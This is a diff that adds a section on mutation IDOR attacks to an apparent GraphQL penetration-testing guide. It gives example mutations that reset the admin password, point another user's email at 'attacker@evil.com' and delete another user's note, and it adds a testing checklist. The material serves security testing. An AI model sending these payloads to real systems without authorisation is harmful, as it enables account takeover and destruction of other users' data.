@@ -430,6 +430,39 @@ query {
 }
 ```
 
+### Mutation IDOR (Write Operations on Other Users)
+
+Mutations often lack per-object authorization — the resolver trusts the `username`/`id` argument without checking if the caller owns it:
+
+```graphql
+# Change another user's password (no ownership check)
+mutation {
+  UpdatePassword(username: "admin", password: "hacked123") {
+    message
+  }
+}
+
+# Modify another user's profile
+mutation {
+  updateProfile(userId: 1, input: {email: "attacker@evil.com"}) {
+    success
+  }
+}
+
+# Delete another user's resource
+mutation {
+  deleteNote(noteId: 42) {
+    success
+  }
+}
+```
+
+**Testing checklist:**
+1. Introspect ALL mutations — look for username/id/email arguments
+2. Test each mutation with another user's identifier while authenticated as yourself
+3. Try both sequential IDs and usernames from enumerated user lists
+4. Check if mutations validate caller identity vs the target object
+
 ### Information Disclosure
 
 ```graphql
